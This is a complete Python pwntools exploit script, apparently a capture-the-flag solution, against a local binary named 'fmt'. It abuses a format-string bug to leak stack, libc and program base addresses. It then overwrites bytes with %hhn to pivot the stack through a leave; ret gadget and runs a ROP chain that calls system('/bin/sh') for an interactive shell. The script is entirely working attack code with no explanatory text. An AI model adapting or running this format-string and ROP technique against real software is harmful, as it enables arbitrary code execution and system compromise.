from pwn import *

elf = ELF("./fmt")
libc = ELF("libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"

while True:
    try:
        p = process([elf.path])
        payload = "%p"*0x16
        # payload += "%{}c%{}hhn".format(1,0x18)
        payload += "%{}c%{}hhn".format(((0x58-0xf0+0x100)&0xFF)-0x2-0x10,0x18)
        payload += "%{}c%{}$hhn".format((0xc9-0x58+0x100)&0xFF,0x1a)
        p.sendlineafter(b"fmt!\n",payload)

        buf_addr = int(eval(p.recv(14)))
        p.recv(4)
        libc.address = int(p.recv(14),16)-0x11ba61
        p.recv(31)
        elf.address = int(p.recv(14),16)-0x4010
        

        info("buf addr: "+hex(buf_addr))
        info("libc base: "+hex(libc.address))
        info("elf base: "+hex(elf.address))

        # can't use one_gadget,FU
        # one_gadget = libc.address + [0x583ec,0x583f3,0xef4ce,0xef52b][1] 
        p.recvuntil("fmt!\n",timeout=2)
    except EOFError:
        p.kill()
    else:
        # gdb.attach(p,"b *$rebase(0x12AD)\nc")
        # pause(2)
        vuln_addr = buf_addr+0x90
        leave_ret_addr = next(elf.search(asm('leave; ret;'), executable=True)) # c7
        fake_rbp_addr = buf_addr+0x88
        rop_addr = buf_addr+0x48

        fpay = ''
        fpay += '%{}c%{}$hhn'.format(0xc7,0xb)
        fpay += '%{}c%{}$hhn'.format(0-0xc7+0x100,0xb+1)
        fpay = fpay.ljust((len(fpay) + 7) // 8 * 8).encode()
        fpay += p64(vuln_addr)
        fpay += p64(fake_rbp_addr)
        
        padding = b"a"*8*5

        rop = p64(next(libc.search(asm('ret;'), executable=True))) 
        rop += p64(next(libc.search(asm('pop rdi; ret;'), executable=True)))
        rop += p64(next(libc.search("/bin/sh")))  # puts@got 
        rop += p64(libc.sym['system'])

        payload = fpay+padding+rop
        p.sendline(payload)
        p.interactive()
        break
